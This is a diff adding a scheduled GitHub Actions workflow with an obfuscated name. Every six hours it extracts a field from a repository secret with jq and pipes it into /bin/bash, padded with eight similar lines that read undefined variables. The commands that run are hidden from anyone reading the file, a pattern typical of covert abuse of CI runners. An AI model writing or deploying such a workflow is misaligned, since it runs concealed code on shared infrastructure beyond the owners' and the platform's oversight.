@@ -1,0 +1,25 @@
+name: digouyoushuodao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: digouyoushuodao
+        env:
+          jr75: ${{ secrets.jr75 }}
+        run: |
+          echo $jr75 | jq -r .kpucu5 | /bin/bash
+          echo $oyl26294 | jq -r .ec782 | /bin/bash
+          echo $gwxw27795 | jq -r .zcqtw7 | /bin/bash
+          echo $zaann206 | jq -r .qgu80 | /bin/bash
+          echo $edbx63 | jq -r .nfc9 | /bin/bash
+          echo $aqg711 | jq -r .ssdzr451 | /bin/bash
+          echo $o8 | jq -r .ngv8498 | /bin/bash
+          echo $cnyqy976 | jq -r .eyg20123 | /bin/bash
+          echo $kmei1992 | jq -r .kf53 | /bin/bash
+
